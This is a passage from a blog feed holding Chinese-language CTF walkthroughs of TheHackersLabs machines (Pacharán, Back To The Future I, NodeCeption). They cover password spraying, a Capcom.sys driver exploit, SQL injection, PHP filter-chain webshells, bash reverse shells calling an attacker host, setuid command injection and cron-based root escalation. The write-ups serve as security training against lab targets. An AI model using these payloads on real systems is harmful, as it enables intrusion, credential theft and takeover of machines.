PACHARAN.THL\\krbtgt:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\\DefaultAccount:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\\Orujo:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\\Ginebra:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\\Whisky:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\\Hendrick:TurkisArrusPuchuchuSiu1 STATUS_LOGON_FAILURE \nSMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\\Chivas Regal:TurkisArrusPuchuchuSiu1\n```\n\n得到一个凭据：`ChivasRegal:TurkisArrusPuchuchuSiu1`\n\n就是我们上边看到远程管理组的用户\n\n```bash\n➜  Pacharán nxc winrm 192.168.69.69 -u 'Chivas Regal' -p 'TurkisArrusPuchuchuSiu1'\nWINRM       192.168.69.69   5985   WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL)\n/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.\n  arc4 = algorithms.ARC4(self._key)\nWINRM       192.168.69.69   5985   WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\\Chivas Regal:TurkisArrusPuchuchuSiu1 (Pwn3d!)\n```\n\n`Chivas Regal` 用户可以读取 `user.txt`\n\n```bash\n*Evil-WinRM* PS C:\\Users\\Chivas Regal\\Desktop> type user.txt\nbb8b4xxxxxxxxxxxxxxxxxxxxxxxxxx\n```\n\n## SeLoadDriverPrivilege\n\n`whoami` 信息\n\n![image.png](/post-images/TheHackersLabsPacharán/image6.png)\n\n能找到 `SeLoadDriverPrivilege` ，这是默认的账户不存在的权限\n\n能找一些存储库： https://github.com/k4sth4/SeLoadDriverPrivilege\n\n```bash\n*Evil-WinRM* PS C:\\temp> .\\ExploitCapcom.exe LOAD C:\\temp\\Capcom.sys\n[*] Service Name: uciifgxe\n[+] Enabling SeLoadDriverPrivilege\n[+] SeLoadDriverPrivilege Enabled\n[+] Loading Driver: \\Registry\\User\\S-1-5-21-3046175042-3013395696-775018414-1108\\???????????????????\nNTSTATUS: 00000000, WinError: 0\n\n*Evil-WinRM* PS C:\\temp> .\\ExploitCapcom.exe EXPLOIT whoami\n[*] Capcom.sys exploit\n[*] Capcom.sys handle was obtained as 0000000000000064\n[*] Shellcode was placed at 0000013180FE0008\n[+] Shellcode was executed\n[+] Token stealing was successful\n[+] Command Executed\nnt authority\\system\n```\n\n成功拿到 `system` 用户权限\n\n这里可以使用 `msf` 来弹，不多赘述….\n\n最后运行恶意 `exe` 即可弹回来\n\n![image.png](/post-images/TheHackersLabsPacharán/image7.png)\n\n```bash\nC:\\Users\\Administrador\\Desktop>type root.txt\ntype root.txt\ncfa7cb1cc20e26c0428f9222d44c76a0  -\n```\n\n## 总结\n\n打印机那里有点没想到，要看描述\n\n最后 SeLoadDriverPrivilege 卡了一下，`payload`需要改一下",
            "url": "https://www.sunsetaction.top/2025/07/27/TheHackersLabsPacharán",
            "title": "TheHackersLabs - Pacharán",
            "summary": "Pacharán https://labs.thehackerslabs.com/machine/61 Recon PortScan 枚举 SMB 匿名测试 可以使用匿名账户 直接用nxc全部拉下来 得到一个 txt 文件 Orujo.txt 像是一个凭据，测试一下 成功拿到 orujo 的凭据 域...",
            "date_modified": "2025-07-27T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "靶机",
                "TheHackersLabs",
                "Windows",
                "SeLoadDriverPrivilege",
                "Crack"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/07/26/TheHackersLabsBack To The Future I",
            "content_html": "\n# Back To The Future I\n\n> https://labs.thehackerslabs.com/machine/119\n> \n\n![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image.png)\n\n## Recon\n\n### PortScan\n\n```bash\n➜  Back_To_The_Future_I nmap -sT -min-rate 10000 -p- 192.168.56.94\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-26 14:01 CST\nNmap scan report for 192.168.56.94\nHost is up (0.00056s latency).\nNot shown: 65531 closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n21/tcp   open  ftp\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\nMAC Address: 08:00:27:82:2C:CD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 3.52 seconds\n```\n\n```bash\n➜  Back_To_The_Future_I nmap -sT -A -p 21,22,80,3306 192.168.56.94\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-26 14:05 CST\nNmap scan report for 192.168.56.94\nHost is up (0.00051s latency).\n\nPORT     STATE SERVICE VERSION\n21/tcp   open  ftp     vsftpd 3.0.3\n22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)\n| ssh-hostkey: \n|   256 f7:c5:4a:ca:73:0e:21:ed:9f:5d:7e:35:65:f6:9f:b2 (ECDSA)\n|_  256 fc:f2:e9:1a:ae:3c:da:94:f5:db:11:b2:8b:5c:7f:32 (ED25519)\n80/tcp   open  http    Apache httpd 2.4.62\n|_http-title: Did not follow redirect to http://hillvalley.thl/\n|_http-server-header: Apache/2.4.62 (Debian)\n3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)\nMAC Address: 08:00:27:82:2C:CD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose|router\nRunning: Linux 4.X|5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 1 hop\nService Info: Host: _default_; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.51 ms 192.168.56.94\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 9.68 seconds\n```\n\n### 枚举\n\n`FTP` 匿名\n\n```bash\n➜  Back_To_The_Future_I ftp 192.168.56.94\nConnected to 192.168.56.94.\n220 (vsFTPd 3.0.3)\nName (192.168.56.94:root): anonymous\n530 Permission denied.\nftp: Login failed\n```\n\n`HTTP` 服务\n\n![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image1.png)\n\n查看源码能找到\n\n```bash\n  <!-- ¡El reloj de la torre no tiene nada que ver! ¿O sí? -->\n  <!-- 塔钟跟这事儿一点关系都没有！或者说，有关系？-->\n```\n\n目录爆破\n\n```bash\n➜  Back_To_The_Future_I feroxbuster --url http://hillvalley.thl/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt --filter-status 404,503,400 -x a\nsp,php,txt,zip                                                                                  \n                                                                                                \n ___  ___  __   __     __      __         __   ___                           \n|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__                                                                                                                                               \n|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___                                                                                                                                              \nby Ben \"epi\" Risher 🤓                 ver: 2.11.0                                                                                                                                              \n───────────────────────────┬──────────────────────                                                                                                                                              \n 🎯  Target Url            │ http://hillvalley.thl/\n 🚀  Threads               │ 50\n 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt\n 💢  Status Code Filters   │ [404, 503, 400]\n 💥  Timeout (secs)        │ 7\n 🦡  User-Agent            │ feroxbuster/2.11.0\n 💉  Config File           │ /etc/feroxbuster/ferox-config.toml\n 🔎  Extract Links         │ true\n 💲  Extensions            │ [asp, php, txt, zip]\n 🏁  HTTP methods          │ [GET]\n 🔃  Recursion Depth       │ 4\n───────────────────────────┴──────────────────────\n 🏁  Press [ENTER] to use the Scan Management Menu™\n──────────────────────────────────────────────────\n403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n200      GET      175l      325w     3150c http://hillvalley.thl/css/styles.css\n200      GET       69l      176w     2948c http://hillvalley.thl/index.php\n200      GET       69l      176w     2948c http://hillvalley.thl/\n200      GET        3l       28w      240c http://hillvalley.thl/about.php\n302      GET        0l        0w        0c http://hillvalley.thl/admin.php => index.php\n301      GET        9l       28w      314c http://hillvalley.thl/css => http://hillvalley.thl/css/\n301      GET        9l       28w      314c http://hillvalley.thl/img => http://hillvalley.thl/img/\n200      GET      140l      809w    61123c http://hillvalley.thl/img/flux_capacitor.png\n301      GET        9l       28w      313c http://hillvalley.thl/js => http://hillvalley.thl/js/\n200      GET       23l       61w      838c http://hillvalley.thl/js/index.js\n302      GET        0l        0w        0c http://hillvalley.thl/logout.php => index.php\n200      GET        0l        0w        0c http://hillvalley.thl/config.php\n200      GET        6l       25w      216c http://hillvalley.thl/logs.php\n200      GET     9932l    58762w  4734247c http://hillvalley.thl/img/delorean.png\n200      GET       28l      143w     1121c http://hillvalley.thl/time_machine.php\n[####################] - 79s  1038210/1038210 0s      found:15      errors:0      \n[####################] - 78s  1038145/1038145 13250/s http://hillvalley.thl/ \n[####################] - 0s   1038145/1038145 94376818/s http://hillvalley.thl/css/ => Directory listing (add --scan-dir-listings to scan)\n[####################] - 7s   1038145/1038145 146548/s http://hillvalley.thl/img/ => Directory listing (add --scan-dir-listings to scan)\n[####################] - 0s   1038145/1038145 37076607/s http://hillvalley.thl/js/ => Directory listing (add --scan-dir-listings to scan)\n```\n\n`about.php`\n\n![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image2.png)\n\n`logs.php`\n\n![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image3.png)\n\n`time_machine.php`\n\n ？EI Psy Kongroo ~\n\n![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image4.png)\n\n没找到信息，尝试爆破登录框，也是不成功\n\n![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image5.png)\n\n测试一下登录框\n\n发现存在 `SQL` 注入\n\n![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image6.png)\n\n## SQL 注入\n\n直接上 `SQLmap` ，测试出来 延时注入\n\n![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image7.png)\n\n将数据都爆出来\n\n```bash\ncurrent user: 'marty@localhost'\ncurrent database: 'hillvalley'\n\nDatabase: hillvalley\n[1 table]\n+-------+\n| users |\n+-------+\n\n+----+--------------------------------------------------------------+----------+\n| id | password                                                     | username |\n+----+--------------------------------------------------------------+----------+\n| 1  | $2y$10$.YPplAJvApyzvxjuWXdeHO1lIkolJIq9GzGERgmHqHLi.1/.zGJhy | marty    |\n+----+--------------------------------------------------------------+----------+\n```\n\n将密码进行爆破\n\n```bash\n➜  Back_To_The_Future_I john --wordlist=/usr/share/wordlists/rockyou.txt hash                 \nUsing default input encoding: UTF-8\nLoaded 1 password hash (bcrypt [Blowfish 32/64 X3])\nCost 1 (iteration count) is 1024 for all loaded hashes\nWill run 8 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nandromeda        (?)     \nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed. \n```\n\n得到一个账户 `marty`:`andromeda`\n\n## 文件包含\n\n登录进去后台\n\n![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image8.png)\n\n得到一些关于密码信息\n\n```bash\n我实施了一项基本的安全措施来保护关键的项目文件。\n我使用了与我的时光机和第一次跳跃的日期相关的密码。\n\n马蒂永远不会忘记那一天。\n\n——医生\n```\n\n我们还注意到`URL`是貌似是包含文件的，我们尝试一下包含一下别的文件\n\n成功将 `/etc/passwd` 包含出来\n\n![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image9.png)\n\n可以直接将 `user.txt` 给包含出来\n\n![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image10.png)\n\n但我们的目的是拿到 `shell` \n\n测试伪协议是否可以使用\n\n![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image11.png)\n\n我们尝试通过 `php://filter/write` 来写入文件，但是并没有成功\n\n```bash\nphp://filter/write=convert.base64-decode/resource=shell.php&data=PD9waHAgZXZhbChzeXN0ZW0oJF9QT1NUWyJ4Il0pKTtwaHBpbmZvKCk7Pz4=\n```\n\n通过：https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Wrappers.md\n\n能到一个工具 **PHP filter chain generator**：https://github.com/synacktiv/php_filter_chain_generator\n\n生成 `payload`：\n\n```bash\npython3 php_filter_chain_generator.py --chain '<?php phpinfo(); ?>  '\n```\n\n![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image12.png)\n\n生成反弹 `shell` 的代码：\n\n```bash\n\tpython3 php_filter_chain_generator.py --chain '<?php eval(system($_GET[\"x\"])); ?>  '\n```\n\n测试代码执行\n\n![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image13.png)\n\n进行反弹 `shell`\n\n```bash\n/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.5/1234 0>&1'\n```\n\n拿到立足点\n\n![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image14.png)\n\n## To Marty\n\n查看配置文件\n\n```bash\nwww-data@hillvalley:/var/www/project/app$ cat config.php \n<?php\n$host = \"localhost\";\n$user = \"marty\";\n$pass = \"t1m3travel\";\n$db = \"hillvalley\";\n\n$conn = mysqli_connect($host, $user, $pass, $db);\nif (!$conn) {\n    die(\"Connection failed: \" . mysqli_connect_error());\n}\n?>\n```\n\n拿到数据库账号密码，因为用户名是 `marty` ，我们顺便碰撞一下密码\n\n```bash\nwww-data@hillvalley:/var/www/project/app$ su marty\nPassword: \nmarty@hillvalley:/var/www/project/app$ \n```\n\n成功切换到用户`Marty`\n\n我们写入 `SSH` 公钥，使用公钥进行登录\n\n## To docbrown\n\n家目录下的隐藏文件\n\n```bash\nmarty@hillvalley:~$ cat .flux_notes \nTiempos inestables... aún necesito arreglar el runner para la próxima prueba.\n```\n\n> 时间不稳定...仍然需要修复运行器以进行下一次测试。\n> \n\n能直接看`docbrown`的家目录\n\n```bash\nmarty@hillvalley:/home/docbrown$ ls -al\ntotal 88\ndrwxr-xr-x 15 docbrown docbrown 4096 Jul 15 10:45 .\ndrwxr-xr-x  4 root     root     4096 Jul 12 15:49 ..\nlrwxrwxrwx  1 root     root        9 Jul 13 16:50 .bash_history -> /dev/null\n-rw-r--r--  1 docbrown docbrown  220 Jul 11 22:04 .bash_logout\n-rw-r--r--  1 docbrown docbrown 3662 Jul 12 20:23 .bashrc\ndrwx------ 10 docbrown docbrown 4096 Jul 11 22:27 .cache\ndrwx------  9 docbrown docbrown 4096 Jul 12 20:41 .config\n-rw-r--r--  1 docbrown docbrown 5290 Jul 11 22:04 .face\nlrwxrwxrwx  1 docbrown docbrown    5 Jul 11 22:04 .face.icon -> .face\n-rw-r--r--  1 docbrown docbrown  110 Jul 13 14:10 .flux_hint\ndrwx------  4 docbrown docbrown 4096 Jul 11 22:08 .local\ndrwx------  4 docbrown docbrown 4096 Jul 11 22:27 .mozilla\n-rw-r--r--  1 docbrown docbrown  807 Jul 11 22:04 .profile\n-rw-------  1 docbrown docbrown  817 Jul 13 12:52 .viminfo\ndrwxr-xr-x  2 docbrown docbrown 4096 Jul 11 22:08 Desktop\ndrwxr-xr-x  2 docbrown docbrown 4096 Jul 11 22:08 Documents\ndrwxr-xr-x  2 docbrown docbrown 4096 Jul 11 22:08 Downloads\ndrwxr-xr-x  2 docbrown docbrown 4096 Jul 11 22:08 Music\ndrwxr-xr-x  2 docbrown docbrown 4096 Jul 11 22:08 Pictures\ndrwxr-xr-x  2 docbrown docbrown 4096 Jul 11 22:08 Public\ndrwxr-xr-x  2 docbrown docbrown 4096 Jul 11 22:08 Templates\ndrwxr-xr-x  2 docbrown docbrown 4096 Jul 11 22:08 Videos\ndrwxrwxrwx  2 docbrown docbrown 4096 Jul 12 20:49 docs\n```\n\n`.flux_hint`\n\n```bash\nmarty@hillvalley:/home/docbrown$ cat .flux_hint \nHe estado trabajando en una nueva forma de sincronizar los scripts del sistema. Cada minuto... como un reloj.\n```\n\n> 我一直在研究一种同步系统脚本的新方法。分分秒秒……精准无误。\n> \n\n提到了同步系统脚本，我们上`pspy`看看\n\n![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image15.png)\n\n注意到 **`/usr/local/bin/flux_admin.sh`**\n\n但是根目录中也是没有\n\n```bash\nmarty@hillvalley:/usr/local/bin$ ls -al\ntotal 40\ndrwxr-xr-x  2 root root  4096 Jul 14 21:53 .\ndrwxr-xr-x 10 root root  4096 Jul 11 21:56 ..\n-rwxr-xr-x  1 root root 16200 Jul 12 20:49 backup_runner\n-rwx------  1 root root 16296 Jul 14 20:44 time_daemon\n```\n\n上 `linpeas.sh` 看看\n\n可以注意到如下信息\n\n```bash\nFiles with capabilities (limited to 50): \n/usr/local/bin/backup_runner cap_setuid=ep \n/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep\n/usr/bin/ping cap_net_raw=ep \n```\n\n当程序 `backup_runner` 运行时一些拥有 `setuid` 权限，可以以其他用户权限运行\n\n我们将其拉出去分析一下\n\n```bash\nint __fastcall main(int argc, const char **argv, const char **envp)\n{\n  char s[264]; // [rsp+10h] [rbp-110h] BYREF\n  const char *v5; // [rsp+118h] [rbp-8h]\n\n  if ( argc != 2 )\n    usage(argc, argv, envp);\n  v5 = argv[1];\n  snprintf(s, 0x100uLL, \"tar czf /tmp/%s-backup.tar.gz /home/docbrown/docs\", v5);\n  setuid(0x3E8u);\n  system(s);\n  return 0;\n}\n```\n\n其中的 `setuid(0x3E8u);` 也就是 `1000` ，而 `1000` 刚好是 `docbrown`\n\n并且执行的命令是 `tar czf /tmp/%s-backup.tar.gz /home/docbrown/docs`\n\n该程序存在命令注入，因为 `v5` 并没有被处理，而是直接被调用\n\n```bash\n\"; id ;\"\n```\n\n```bash\nmarty@hillvalley:/home/docbrown$ /usr/local/bin/backup_runner \"; id ;\"\ntar: Cowardly refusing to create an empty archive\nTry 'tar --help' or 'tar --usage' for more information.\nuid=1000(docbrown) gid=1001(marty) groups=1001(marty)\nsh: 1: -backup.tar.gz: not found\n```\n\n获得 `docbrown` 的 `shell`\n\n```bash\nmarty@hillvalley:/home/docbrown$ /usr/local/bin/backup_runner \"; /bin/bash -p ;\"\ntar: Cowardly refusing to create an empty archive\nTry 'tar --help' or 'tar --usage' for more information.\ndocbrown@hillvalley:/home/docbrown$ \n```\n\n## To Root\n\n查看 `sudo` 权限\n\n```bash\ndocbrown@hillvalley:/home/docbrown$ sudo -l\nMatching Defaults entries for docbrown on hillvaley:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\n\nUser docbrown may run the following commands on hillvaley:\n    (root) NOPASSWD: /usr/local/bin/time_daemon\n```\n\n我们尝试运行一下\n\n```bash\n[FLUX] No existe el archivo /tmp/sync: No such file or directory\n```\n\n```bash\ndocbrown@hillvalley:/tmp$ vim sync\ndocbrown@hillvalley:/tmp$ sudo time_daemon\n[88MPH] Sincronización completada. Listo para viajar.\n```\n\n![image.png](/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image16.png)\n\n貌似是创建定时任务\n\n我们将提权语句写入 `/tmp/sync` 并运行 `time_deamon`\n\n```bash\ndocbrown@hillvalley:/tmp$ echo \"chmod +s /bin/bash\" > /tmp/sync\n\ndocbrown@hillvalley:/usr/local/bin$ sudo /usr/local/bin/time_daemon\n[88MPH] Sincronización completada. Listo para viajar.\n```\n\n等在 `pspy` 显示运行计划任务，再查看\n\n```bash\ndocbrown@hillvalley:/usr/local/bin$ ls -al /bin/bash\n-rwsr-sr-x 1 root root 1265648 Apr 18 19:47 /bin/bash\n```\n\n最后读取 `root.txt`\n\n```bash\nbash-5.2# cat notes.txt \n¡Felicidades, viajero del tiempo!\n\nLograste lo imposible: viajaste al pasado, burlaste sistemas protegidos, superaste obstáculos temporales y... \n¡volviste al futuro con todos los flags en el DeLorean!\n\nDoc estaría orgulloso, y Marty… bueno, seguro todavía está en problemas con Biff. \nPero vos… vos demostraste que no hay sistema que se te resista ni timeline que no puedas manipular.\n\n    “El futuro no está escrito, todavía. El tuyo será exactamente como lo hagas.”\n    — Doc Emmett Brown\n\nGracias por jugar este CTF inspirado en una de las mejores trilogías de todos los tiempos. \n\nSi disfrutaste el viaje, no olvides compartir tus hallazgos con otros hackers del tiempo y prepararte para los próximos desafíos que se vienen en la saga.\n\nbash-5.2# cat root.txt \nFLAGxxxxxxxxxxxxxxxxxxxxxx\n```\n\n## 总结\n\n难度还好，就是有些地方会卡住",
            "url": "https://www.sunsetaction.top/2025/07/26/TheHackersLabsBack To The Future I",
            "title": "TheHackersLabs - Back To The Future I",
            "summary": "Back To The Future I https://labs.thehackerslabs.com/machine/119 Recon PortScan 枚举 FTP 匿名 HTTP 服务 查看源码能找到 目录爆破 about.php logs.php time machine.php ？EI...",
            "date_modified": "2025-07-26T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "靶机",
                "TheHackersLabs",
                "Linux",
                "SQLInjection",
                "FileInclude",
                "CommandInjection"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/07/25/TheHackersLabsNodeCeption",
            "content_html": "\n# NodeCeption\n\n> https://labs.thehackerslabs.com/machine/118\n> \n\n![image.png](/post-images/TheHackersLabsNodeCeption/image.png)\n\n## Recon\n\n### PortScan\n\n```bash\n➜  NodeCeption nmap -sn 192.168.56.0/24\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-25 20:09 CST\nNmap scan report for 192.168.56.1\nHost is up (0.00034s latency).\nMAC Address: 0A:00:27:00:00:09 (Unknown)\nNmap scan report for 192.168.56.2\nHost is up (0.00028s latency).\nMAC Address: 08:00:27:BE:8A:D9 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report for 192.168.56.88\nHost is up (0.00058s latency).\nMAC Address: 08:00:27:B3:A3:BC (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report for 192.168.56.5\nHost is up.\nNmap done: 256 IP addresses (4 hosts up) scanned in 2.09 seconds\n```\n\n```bash\n➜  NodeCeption nmap -sT -min-rate 10000 -p- 192.168.56.88\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-25 20:11 CST\nNmap scan report for 192.168.56.88\nHost is up (0.00070s latency).\nNot shown: 65532 closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n5678/tcp open  rrac\n8765/tcp open  ultraseek-http\nMAC Address: 08:00:27:B3:A3:BC (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 3.73 seconds\n```\n\n```bash\n➜  NodeCeption nmap -sT -A -p 22,5678,8765 192.168.56.88\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-25 20:12 CST\nNmap scan report for 192.168.56.88\nHost is up (0.00053s latency).\n\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   256 67:df:2b:e6:48:16:ec:91:b1:a6:67:25:37:05:fc:0f (ECDSA)\n|_  256 dc:ab:74:b7:be:b5:49:6a:c8:7b:db:6b:7c:91:73:69 (ED25519)\n5678/tcp open  rrac?\n| fingerprint-strings:\n|   GetRequest:\n|     HTTP/1.1 200 OK\n|     Accept-Ranges: bytes\n|     Cache-Control: public, max-age=86400\n|     Last-Modified: Fri, 25 Jul 2025 12:09:30 GMT\n|     ETag: W/\"7b7-198417d0a9c\"\n|     Content-Type: text/html; charset=utf-8\n|     Content-Length: 1975\n|     Vary: Accept-Encoding\n|     Date: Fri, 25 Jul 2025 12:12:38 GMT\n|     Connection: close\n|     <!DOCTYPE html>\n|     <html lang=\"en\">\n|     <head>\n|     <script type=\"module\" crossorigin src=\"/assets/polyfills-B8p9DdqU.js\"></script>\n...\n8765/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))\n|_http-server-header: Apache/2.4.58 (Ubuntu)\n|_http-title: Apache2 Ubuntu Default Page: It works\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port5678-TCP:V=7.95%I=7%D=7/25%Time=688374B9%P=x86_64-pc-linux-gnu%r(Ge\nSF:tRequest,8DC,\"HTTP/1\\.1\\x20200\\x20OK\\r\\nAccept-Ranges:\\x20bytes\\r\\nCach\nSF:e-Control:\\x20public,\\x20max-age=86400\\r\\nLast-Modified:\\x20Fri,\\x2025\\\nSF:x20Jul\\x202025\\x2012:09:30\\x20GMT\\r\\nETag:\\x20W/\\\"7b7-198417d0a9c\\\"\\r\\n\nSF:Content-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x201975\nSF:\\r\\nVary:\\x20Accept-Encoding\\r\\nDate:\\x20Fri,\\x2025\\x20Jul\\x202025\\x201\nSF:2:12:38\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n<!DOCTYPE\\x20html>\\n<html\nSF:\\x20lang=\\\"en\\\">\\n\\t<head>\\n\\t\\t<script\\x20type=\\\"module\\\"\\x20crossorig\nSF:in\\x20src=\\\"/assets/polyfills-B8p9DdqU\\.js\\\"></script>\\n\\n\\t\\t<meta\\x20\nSF:charset=\\\"utf-8\\\"\\x20/>\\n\\t\\t<meta\\x20http-equiv=\\\"X-UA-Compatible\\\"\\x2\nSF:0content=\\\"IE=edge\\\"\\x20/>\\n\\t\\t<meta\\x20name=\\\"viewport\\\"\\x20content=\\\nSF:\"width=device-width,initial-scale=1\\.0\\\"\\x20/>\\n\\t\\t<link\\x20rel=\\\"icon\n```\n\n### 枚举测试\n\n`8765` `Apache`默认页面\n\n![image.png](/post-images/TheHackersLabsNodeCeption/image1.png)\n\n`5678` `n8n`\n\n![image.png](/post-images/TheHackersLabsNodeCeption/image2.png)\n\n`n8n` 可以反弹 `shell`，但是要进入后台，并且需要邮箱和密码\n\n## 密码爆破\n\n我么寻找一下哪里能找到信息\n\n`8765` 源码中得到信息\n\n![image.png](/post-images/TheHackersLabsNodeCeption/image3.png)\n\n> usuario@maildelctf.com\n希望您已按照说明更改密码。\n请记住：密码至少 8 个字符，至少包含 1 个数字和 1 个大写字母。\n> \n\n得到一个邮箱和密码策略\n\n通过AI 写出正则表达式，然后匹配 `rockyou` 前 `5000` 的字典\n\n```bash\n➜  NodeCeption head -n 5000 /usr/share/wordlists/rockyou.txt | grep -P '^(?=.*\\d)(?=.*[A-Z]).{8,}$'                                                                          \nPassword1\nPASSWORD1\n```\n\n使用 `usuario@maildelctf.com`:`Password1` 可以登录进去\n\n![image.png](/post-images/TheHackersLabsNodeCeption/image4.png)\n\n## n8n 后台利用\n\n通过工作流运行命令\n\n![image.png](/post-images/TheHackersLabsNodeCeption/image5.png)\n\n测试一下\n\n![image.png](/post-images/TheHackersLabsNodeCeption/image6.png)\n\n成功访问\n\n![image.png](/post-images/TheHackersLabsNodeCeption/image7.png)\n\n反弹 `shell` ，这里没法用`nc` 弹\n\n```bash\n/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.5/1234 0>&1'\n```\n\n![image.png](/post-images/TheHackersLabsNodeCeption/image8.png)\n\n拿到立足点\n\n```bash\n➜  NodeCeption nc -lvp 1234\nlistening on [any] 1234 ...\n192.168.56.88: inverse host lookup failed: Unknown host\nconnect to [192.168.56.5] from (UNKNOWN) [192.168.56.88] 48536\nbash: cannot set terminal process group (2231): Inappropriate ioctl for device\nbash: no job control in this shell\nthl@nodeception:~$ \n```\n\n当前目录中可以拿到 `user.txt`\n\n```bash\nthl@nodeception:~$ cat user.txt \nTHL_wxxxxxxxxxxxxxxxxxxx\n```\n\n## 权限提升\n\n一看用户组\n\n```bash\nthl@nodeception:~$ id\nuid=1000(thl) gid=1000(thl) groups=1000(thl),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),101(lxd)\n```\n\n再看 `sudo` 权限\n\n```bash\nthl@nodeception:~$ sudo -l\nMatching Defaults entries for thl on nodeception:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser thl may run the following commands on nodeception:\n    (ALL) NOPASSWD: /usr/bin/vi\n    (ALL : ALL) 